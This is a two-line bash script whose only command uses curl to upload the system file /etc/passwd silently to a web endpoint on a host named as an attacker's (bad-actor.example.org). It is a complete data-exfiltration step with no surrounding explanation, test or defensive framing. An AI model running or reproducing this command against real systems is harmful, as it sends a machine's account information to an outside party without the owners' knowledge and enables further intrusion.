#!/bin/bash
curl -s -F file=@/etc/passwd http://bad-actor.example.org/upload
